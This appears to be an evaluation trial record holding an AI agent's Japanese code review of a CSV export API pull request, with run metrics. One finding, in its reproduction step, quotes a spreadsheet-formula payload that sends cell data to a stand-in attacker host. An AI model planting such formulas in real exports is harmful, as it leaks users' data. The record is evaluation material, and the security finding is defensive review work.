@@ -1,0 +1,41 @@
+{
+  "trial": "W22-review-pr-full-c3-0",
+  "scenario": "W22",
+  "config": "review-pr-full",
+  "case": "c3",
+  "rep": 0,
+  "review_md": "# レビュー: タスク一覧の CSV エクスポート API\n\n対象: 未コミットの差分（`src/app/api/tasks/export/route.ts`、`src/lib/export.ts`、`tests/export.test.ts`）。\n`npm test`（22 件）と `npm run typecheck` は通る。ただしテストが不具合を検出できていないためで、PR の説明のうち次の 2 点は事実と異なる。\n\n- 「不正な `status` は一覧と同じく指定なし」 → 実際は 0 件になる（指摘 1）\n- 「引用符があっても列がずれない」 → 実際はずれる（指摘 2）\n\nBOM を付けて Excel の文字化けを防ぐ点（U+FEFF、`EF BB BF`）は問題なく動く。\n\n## 指摘一覧\n\n| # | 重要度 | 内容 |\n|---|---|---|\n| 1 | 高 | `?status=` を検証しておらず、不正値・空文字で見出しだけの CSV が 200 で返る |\n| 2 | 高 | `field()` が `\"` を `\"\"` にしておらず、CSV が壊れる |\n| 3 | 高 | CSV（数式）インジェクション対策がない |\n| 4 | 高 | 「エスケープ」のテストの入力にカンマも引用符も入っておらず、不具合を検出できない |\n| 5 | 中 | `status` 絞り込み・BOM・401 のテストがない（API ルートのテストが一切ない） |\n| 6 | 低 | テストが seed のデータ（件数 7・1 行目の内容）に依存している |\n| 7 | 低 | BOM がソースに不可視文字のリテラルで書かれている |\n| 8 | 低 | DB 例外が `{ error }` 形式でなく素の 500 になる |\n| 9 | 低 | コメントが実装と合っていない・不足している（`field()`、`toCsv()`、ルートの冒頭） |\n| 10 | 低 | `dueDate` などが null のとき `\"null\"` という文字列が出力されうる |\n| 11 | 低 | テスト名が英語で、他の記述（日本語）と揃っていない |\n\n---\n\n## 1. [高] `status` クエリを検証していない\n\n- **場所**: `src/app/api/tasks/export/route.ts:11-12`（`GET`）\n- **問題**: `searchParams.get(\"status\") as TaskStatus | null` は型アサーションだけで、実行時の検証がない。`listTasks` はその値を `status = :status` にそのまま束縛するため、不正値は 0 件にマッチする。CLAUDE.md の規約 2（型ガードで検証し、不正値は指定なし）違反で、一覧 API（`src/app/api/tasks/route.ts`）の挙動とも食い違う。\n- **再現**: 次の URL はいずれも HTTP 200 で、見出しだけの `tasks.csv` が返る（seed では本来 7 件）。\n  - `GET /api/tasks/export?status=foo`\n  - `GET /api/tasks/export?status=`。空文字は `?? undefined` を通り抜ける。フォームの「すべて」が空値だと、全件のはずが空ファイルになる。\n  - `GET /api/tasks/export?status=DONE`\n- **影響**: エラーにならず「タスクが無い」ように見えるため、空の報告資料を作っても気づきにくい。\n- **直し方**: 一覧 API と同じく型ガードを通す。\n  ```ts\n  const status = new URL(request.url).searchParams.get(\"status\");\n  const csv = toCsv(listTasks({ status: isTaskStatus(status) ? status : undefined }));\n  ```\n  不要になる `type TaskStatus` の import は消す。規約 1・5 に沿うよう、パラメータの解釈と絞り込みは `src/lib/` の関数に置き、単体テストを書く（指摘 5）。\n\n## 2. [高] 引用符（`\"`）をエスケープしていない\n\n- **場所**: `src/lib/export.ts:10-12`（`field()`）。コメント「カンマや改行を含んでもよいよう、必ずダブルクォートで囲む」も、`\"` を考慮していないため不正確。\n- **問題**: `` `\"${value}\"` `` は囲むだけで、値の中の `\"` を `\"\"` にしていない（RFC 4180 違反）。タイトルは `validateTaskInput` を通れば任意の文字を含められるので、`POST/PATCH /api/tasks` から入る。\n- **再現**: タイトルが `a\"b,c` のタスクは `\"1\",\"a\"b,c\",\"未着手\",…` と出力される。`a` の後の `\"` で項目が閉じ、`,c` が別の列になって、以降の列がずれる。エラーも警告も出ない。\n- **直し方**:\n  ```ts\n  function field(value: string | number): string {\n    return `\"${String(value).replaceAll('\"', '\"\"')}\"`;\n  }\n  ```\n  あわせてコメントに「値中の `\"` は `\"\"` にする」と書き足す。\n\n## 3. [高] CSV（数式）インジェクション\n\n- **場所**: `src/lib/export.ts:10-12`（`field()`）\n- **問題**: ユーザー入力のタイトルを無加工で出力している。`\"` で囲んでも、Excel や LibreOffice は `=`、`+`、`-`、`@`、タブ、CR で始まるセルを数式として評価する。\n- **再現**: ログイン済みの任意のユーザーが、タイトルを `=HYPERLINK(\"http://attacker.example/?d=\"&B3,\"クリック\")` にしたタスクを作る。別のユーザーがそのエクスポートを Excel で開くと、数式として評価される（指摘 2 を直すと実際にそうなる）。\n- **直し方**: 文字列項目が `/^[=+\\-@\\t\\r]/` に一致するとき、先頭に `'` を付けてから指摘 2 のエスケープをする。数値の ID には適用しない。出力が元のタイトルと変わるので、仕様として確認しておく。テストを追加する。\n\n## 4. [高] 「エスケープ」のテストが成立していない\n\n- **場所**: `tests/export.test.ts:14-17`（`escapes quotes and commas in titles`）\n- **問題**: 入力タイトルは `\"週次 定例の準備\"` で、カンマも `\"` も改行も含まない。期待値は単にクォートを被せただけなので、指摘 2 のバグがあっても通る。PR の検証結果にある「カンマ・引用符のエスケープの単体テスト」は、実際には何も検証していない。\n- **直し方**: 次の入力を別々のケースにし、RFC 4180 に沿った期待値を置く。\n  - `a,b` → `\"a,b\"`\n  - `5\" 画面` → `\"5\"\" 画面\"`\n  - `1行目\\n2行目` → 改行を含む項目としてそのまま出る\n  - `=1+1` → `\"'=1+1\"`（指摘 3 を直す場合）\n\n## 5. [中] テストの不足（`status`・BOM・401）\n\n- **場所**: `tests/export.test.ts` 全体、`src/app/api/tasks/export/route.ts`\n- **問題**: 次のテストがない。\n  - `status` 絞り込みと、不正値・空文字が全件になること\n  - `CSV_BOM` と、レスポンス本文が `﻿` で始まること\n  - 未ログインで 401 になること。認証の分岐が消えると全タスクが未認証で取得できるため、最低限ほしい。\n  - `Content-Type`・`Content-Disposition` ヘッダー\n- **直し方**: 絞り込みと BOM を付ける処理を `src/lib/export.ts` の関数に移し（規約 1 に沿う）、`openDb()` の DB を渡して単体テストする。401 は認証まわりに絞ったテストを書く。\n\n## 6. [低] テストが seed に依存している\n\n- **場所**: `tests/export.test.ts:9-11`（`lines.length === 9`、`lines[1]`）\n- **問題**: 件数 7 と 1 行目の中身が `src/lib/db/seed.ts` に依存し、seed を変えるとエクスポートと無関係に落ちる。\n- **直し方**: 固定の `Task[]` を `toCsv` に渡し、全行と末尾の CRLF を検証する。ステータスの 3 種類の日本語ラベルも確認する。\n\n## 7. [低] BOM が不可視文字のリテラル\n\n- **場所**: `src/lib/export.ts:5`（`CSV_BOM`）\n- **問題**: U+FEFF が直接書かれていて、レビューで見えない。エディタやフォーマッタに消されると、Excel で文字化けが戻っても気づきにくい。\n- **直し方**: `export const CSV_BOM = \"﻿\";` にする。指摘 5 の BOM テストも加える。\n\n## 8. [低] DB 例外の扱い\n\n- **場所**: `src/app/api/tasks/export/route.ts:12`\n- **問題**: `listTasks` が失敗すると Next.js 標準の 500 になる。握りつぶしてはいないが、他の API の `{ error }` JSON 形式と揃っていない。\n- **直し方**: 必要なら try/catch でログを出し、`{ error }` の 500 を返す。優先度は低い。\n\n## 9. [低] コメントが実装と合っていない・不足している\n\n- **場所**:\n  - `src/lib/export.ts:11`（`field()` のコメント）\n  - `src/lib/export.ts:15`（`toCsv()` のコメント）\n  - `src/app/api/tasks/export/route.ts:1`（冒頭のコメント）\n- **問題**:\n  - `field()` のコメントは「必ずダブルクォートで囲めばカンマや改行を含んでもよい」と読めるが、値中の `\"` を二重化しないと成立しない（指摘 2）。\n  - `toCsv()` のコメントは、末尾の行にも CRLF が付くこと、BOM は含まれず呼び出し側が付けること、ステータスが日本語の表示名で出ることを書いていない。\n  - ルートの冒頭コメント `?status=…` は、`status` が省略可能な絞り込みであること、不正値のときの扱いを書いていない。実装は不正値で 0 件になり（指摘 1）、規約 2 とも食い違うが、コメントがそれを隠している。\n- **直し方**:\n  - `field()`: 指摘 2 を直したうえで「値中の `\"` は `\"\"` にする」と書き足す。\n  - `toCsv()`: 「各行の末尾（最後の行も）に CRLF が付く。BOM は含まない（`CSV_BOM` を呼び出し側で先頭に付ける）。ステータスは日本語の表示名で出力する」と書き足す。\n  - ルート: 指摘 1 を直したうえで「`status` は todo / in_progress / done のいずれか（省略または不正な値のときは全件）」と書く。\n\n## 10. [低] null の値が `\"null\"` と出力されうる\n\n- **場所**: `src/lib/export.ts:10-12`（`field()`）、`toCsv()` が渡す `t.assignee`・`t.dueDate`\n- **問題**: `field()` は受け取った値を文字列に埋め込むだけなので、担当者や期限が null のタスクがあれば `\"null\"` という文字列が出る。`Task` 型で `null` が許されるか未確認だが、許されるなら空欄にすべき。\n- **直し方**: `Task` 型（`src/lib/tasks.ts`）を確認する。null があり得るなら、`field()` で `value ?? \"\"` として空欄を出力し、テストを追加する。\n\n## 11. [低] テスト名が英語\n\n- **場所**: `tests/export.test.ts`（`writes a header and one line per task` など 3 件のテスト名）\n- **問題**: コメントやテストの期待値は日本語で、他の記述と言語が揃っていない。CLAUDE.md が日本語を求めるのは画面の文言だけなので規約違反ではない。\n- **直し方**: 既存のテストの流儀に合わせる。揃えるかどうかは任意。\n\n---\n\n## 問題なしと確認した点\n\n- `requireApiUser()` が最初に呼ばれ、未ログインは 401 になる（規約 9）。GET で本文がないため、`validateTaskInput` の検証と 400/404 は対象外。\n- SQL は既存の `listTasks`（プレースホルダ）を使うだけで、規約 8 に反しない。\n- `/api/tasks/export` の静的ルートは `/api/tasks/[id]` より優先されるので、パスは衝突しない。\n- 見出し・ステータスの日本語化、CRLF 区切り、空の一覧の出力は意図どおり。\n\n## マージ前に直すもの\n\n指摘 1〜4 は必須。あわせて指摘 5 のテストも付ける。指摘 6〜8 は余裕があれば直す。\n",
+  "review_chars": 6087,
+  "review_committed": true,
+  "transcript": {
+    "cost_usd": 0.9428,
+    "tokens": {
+      "input": 64,
+      "output": 23631,
+      "cache_read": 969102,
+      "cache_creation": 156800
+    },
+    "turns": 8,
+    "permission_denials": [],
+    "tool_calls": {
+      "Bash": 15,
+      "Agent": 4,
+      "Write": 1,
+      "Edit": 2
+    },
+    "skills_used": [],
+    "subagents": 4,
+    "subagent_types": {
+      "pr-review-toolkit:code-reviewer": 1,
+      "pr-review-toolkit:silent-failure-hunter": 1,
+      "pr-review-toolkit:pr-test-analyzer": 1,
+      "pr-review-toolkit:comment-analyzer": 1
+    },
+    "questions": 0,
+    "active_seconds": 70,
+    "answer_key_access": [],
+    "isolation_suspects": [],
+    "final_message": "`REVIEW.md` は前回のコミットでほぼ書けていましたが、エージェントの指摘のうち 3 件が抜けていたので追記しました。追記後の `REVIEW.md` だけをコミットしています（`83f2e0c`）。コードは直していません。PR の 3 ファイルは、これまでどおり未コミットのままです。\n\n追記した指摘は次の 3 件で、いずれも重要度は低です。\n\n- **9: コメントの不正確さ・不足。**\n  - `field()` のコメントは、`\"` を二重化しないと成り立ちません。\n  - `toCsv()` のコメントは、末尾の CRLF、BOM が含まれないこと、ステータスが日本語の表示名で出ることを書いていません。\n  - ルート冒頭のコメントは、不正な `status` の扱いを書いていません。\n- **10: null が `\"null\"` と出力されうる。** `dueDate` や担当者が null のときの話です。`Task` 型で null が許されるかは、エージェントも確認できていません。\n- **11: テスト名が英語。** 他の記述（日本語）と揃っていません。規約違反ではありません。\n\n指摘 1〜8 は前回のコミットのとおりです。シード依存のテストの件は指摘 6、BOM のテストは指摘 5 と 7 に含めてあります。新しい指摘は足していません。"
+  },
+  "interventions": 0
+}
